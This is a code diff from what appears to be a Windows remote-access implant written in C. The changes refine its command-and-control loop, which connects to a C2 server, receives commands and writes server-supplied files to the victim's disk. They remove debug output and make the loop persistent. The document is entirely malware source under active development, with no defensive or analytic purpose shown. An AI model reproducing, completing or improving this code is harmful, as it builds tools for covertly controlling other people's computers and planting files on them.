@@ -190,13 +190,10 @@ int upload(char * filename, char * content){
 	errno = 0;
 	FILE *outfile;
 	outfile = fopen(filename, "wb");
-	printf("[upload] DBG 1\n");
 	if (!outfile) {
-		printf("[upload] DBG 2\n");
 		return errno;
 	}
 	else {
-		printf("[upload] DBG 3\n");
 		fwrite(content,strlen(content),1,outfile);
 		fclose(outfile);
 		return 0;
@@ -289,7 +286,8 @@ void Shell(char* C2Server, int C2Port)
 /* #endregion */
 
 void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
-	/* #region Connection verification */
+	while (true) {
+		/* #region Connection verification */
 		char RecvData[1024] = "";
 		memset(RecvData, 0, sizeof(RecvData));
 		// here waits for any data input from Server
@@ -301,7 +299,7 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			return;
 		}
 		/* #endregion */
-	while (true) {
+
 		char * command;
 		char delim[] = " ";
 		command = strtok(RecvData, delim);
@@ -392,8 +390,6 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 			int result;
 			result = upload(filename,contents);
 
-			printf("[CnC] DBG 1\n");
-
 			// C&C part
 			char buffer[255];
 			memset(buffer, 0, sizeof(buffer));
@@ -401,10 +397,9 @@ void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
 				strcat(buffer,"\nUploaded "); 
 				strcat(buffer,filename); 
 			}
-			// TODO check if this else works correctly!!
 			else { 
-				printf("[CnC] DBG 2"); 
 				strcat(buffer,"Failed to write file. Errno from fopen: "); 
+				// parse errno
 				char errnos[2];
 				memset(errnos,0,2);
 				_itoa(result,errnos,10);
@@ -461,7 +456,7 @@ void Connect(char* C2Server, int C2Port)
 	}
 	closesocket(tcpsock);
 	WSACleanup();
-	exit(0);
+	return;
 }
 /* #endregion */
 
